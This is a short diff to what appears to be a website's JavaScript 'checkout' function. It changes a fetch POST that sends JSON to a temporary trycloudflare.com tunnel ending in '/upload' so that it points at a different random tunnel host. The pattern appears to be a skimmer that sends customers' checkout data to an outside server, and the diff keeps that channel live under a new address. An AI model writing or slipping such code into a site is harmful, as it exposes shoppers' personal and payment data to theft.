@@ -242,7 +242,7 @@ const checkout = () => {
             };
         });
 
-        fetch('https://contamination-accept-decades-jane.trycloudflare.com/upload', {
+        fetch('https://download-deficit-thomson-apnic.trycloudflare.com/upload', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
